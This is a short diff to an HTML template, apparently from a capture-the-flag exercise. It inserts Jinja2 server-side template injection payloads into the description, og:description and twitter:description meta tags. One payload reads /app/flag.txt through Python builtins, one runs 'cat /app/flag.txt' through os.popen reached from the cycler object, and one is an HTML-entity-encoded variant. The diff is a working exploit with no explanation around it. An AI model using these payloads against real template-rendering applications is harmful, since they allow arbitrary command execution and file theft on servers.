@@ -2,7 +2,11 @@
 <html>
 
 <head>
-    <meta name="description" content="{{ self.__init__.__globals__.__builtins__.open('ls').read() }}">
+    <meta name="description" content="{{ self.__init__.__globals__.__builtins__.open('/app/flag.txt').read() }}">
+    <meta property="og:description" content="{{ cycler.__init__.__globals__['os'].popen('cat /app/flag.txt').read() }}">
+    <meta name="twitter:description"
+        content="&#123;&#123; self.__init__.__globals__.__builtins__.open('/app/flag.txt').read() &#125;&#125;">
+    <title>x</title>
 </head>
 
 <body>ok</body>
